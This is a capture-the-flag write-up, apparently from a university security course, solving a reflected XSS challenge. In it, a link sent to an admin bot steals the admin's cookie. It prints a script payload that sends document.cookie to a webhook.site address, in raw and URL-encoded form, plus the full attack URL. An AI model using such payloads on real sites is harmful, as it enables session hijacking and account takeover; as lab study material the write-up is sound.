# Challenge `My favourite cookies` Writeup

- Vulnerability: 
  - XSS attack
- Where:
  - Feedback link input
- Impact:
  - allows to steal remote user's cookie

## Analyzing the server

This challenges consists in grabbing the admins' cookies.
From the previous challenge, we know that the server is vulnerable to XSS attacks.
The feedback feature allows us to submit a link that the admin will click on.

## Exploit

Knowing that the admin will click on the link, it's possible to take advantage of the search bar action 
`?search=` to send a malicious payload that will reveal the cookies on his browser and then send them
to us.
Start by creating a website on [Webhook](https://webhook.site/) which will receive the remote requests.
Then, get the link to the website and create the following payload:
`<script>location="https://webhook.site/your-unique-id/"+document.cookie</script>`.
Enconde the payload to ensure that it will be correctly interpreted:
`%3Cscript%3Elocation%3D%22https%3A%2F%2Fwebhook.site%2Fyour-unique-id%2F%22%2Bdocument.cookie%3C%2Fscript%3E`
Finally, append it to the search bar action `?search=` and submit it to the admin.
`http://mustard.stt.rnl.tecnico.ulisboa.pt:22251/?search=%3Cscript%3Elocation%3D%22https%3A%2F%2Fwebhook.site%2Fyour-unique-id%2F%22%2Bdocument.cookie%3C%2Fscript%3E`
In the webhook site, you will see a GET request with the cookies in the URL
`https://webhook.site/your-unique-id/SECRET=SSof%7BThis_is_my_secret%7D` revealing the flag
`SSof{This_is_my_secret}`.

## Implementation

No script needed.